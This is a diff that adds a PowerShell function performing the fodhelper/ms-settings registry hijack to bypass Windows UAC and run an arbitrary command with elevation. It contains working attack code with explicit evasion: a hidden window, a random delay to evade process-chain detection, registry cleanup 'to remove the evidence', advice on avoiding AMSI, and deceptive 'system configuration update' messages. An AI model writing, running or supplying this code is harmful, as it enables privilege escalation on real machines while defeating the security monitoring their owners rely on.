@@ -1,0 +1,58 @@
+function Invoke-ElevatedAction {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $false)]
+        [string]
+        $Command = "cmd.exe" # Simpler command
+    )
+
+    # Obfuscate the key registry path by splitting it
+    $RegBase = "HKCU:\Software\Classes"
+    $KeyPath = "ms-settings"
+    $FullPath = "$RegBase\$KeyPath\Shell\Open\command"
+
+    # Obfuscate the fodhelper path using environment variable
+    $TargetBinary = "$env:Windir" + "\System32\fodhelper.exe"
+
+    try {
+        Write-Host "[.] Performing system configuration update..." -ForegroundColor Yellow
+
+        # 1. Create the registry structure
+        # Using -ErrorAction Ignore to be quieter
+        New-Item -Path $FullPath -Force -ErrorAction Ignore | Out-Null
+        New-ItemProperty -Path $FullPath -Name "DelegateExecute" -Value "" -PropertyType String -Force -ErrorAction Ignore | Out-Null
+        Set-ItemProperty -Path $FullPath -Name "(default)" -Value $Command -Force -ErrorAction Ignore | Out-Null
+
+        # Brief, random delay to break the immediate process chain signature
+        $Delay = Get-Random -Minimum 1 -Maximum 3
+        Start-Sleep -Seconds $Delay
+
+        # 2. Execute the target binary
+        # Use Start-Process with altered window style and no profile
+        $Process = Start-Process -FilePath $TargetBinary -WindowStyle Hidden -PassThru -ErrorAction Stop
+
+        Write-Host "[.] Triggering update process (PID: $($Process.Id))..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 2
+
+    }
+    catch {
+        Write-Error "[!] Operation failed: $($_.Exception.Message)"
+    }
+    finally {
+        # 3. Cleanup - Critical to remove the evidence
+        Start-Sleep -Seconds 2
+        Remove-Item -Path "$RegBase\$KeyPath" -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Host "[.] Cleanup completed." -ForegroundColor Green
+    }
+}
+
+# --- MAIN EXECUTION WITH FURTHER OBFUSCATION ---
+
+# Strongly advise running this with additional obfuscation flags from an external shell.
+# The best way to call this function to avoid AMSI is NOT to paste it into a PowerShell window.
+
+Write-Host "This script is best executed via the command line with obfuscation." -ForegroundColor Red
+Write-Host "Example: PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"[script code here]`"" -ForegroundColor Gray
+
+# Example of calling the function with a simple payload
+# Invoke-ElevatedAction -Command "cmd /c start notepad"
